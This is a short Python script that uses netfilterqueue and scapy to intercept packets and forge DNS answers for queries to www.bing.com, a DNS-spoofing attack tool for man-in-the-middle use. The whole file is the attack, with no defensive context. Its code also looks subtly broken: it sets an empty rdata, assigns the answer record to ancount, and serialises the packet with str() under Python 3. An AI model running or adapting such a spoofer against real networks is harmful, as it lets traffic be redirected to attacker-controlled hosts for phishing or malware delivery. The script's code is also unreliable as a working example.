#!/usr/bin/python3
import netfilterqueue
import scapy.all as scapy

def process_pac(packet):
    scapy_pac=scapy.IP(packet.get_payload())
    if scapy_pac.haslayer(scapy.DNSRR):
        qname = scapy_pac[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+]spoofing")
            answer=scapy.DNSRR(rrname=qname, rdata="")
            scapy_pac[scapy.DNS].an = answer
            scapy_pac[scapy.DNS].ancount = answer
            del scapy_pac[scapy.IP].len
            del scapy_pac[scapy.UDP].len
            del scapy_pac[scapy.IP].chksum
            del scapy_pac[scapy.UDP].chksum
            packet.set_payload(str(scapy_pac))

    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_pac)
queue.run()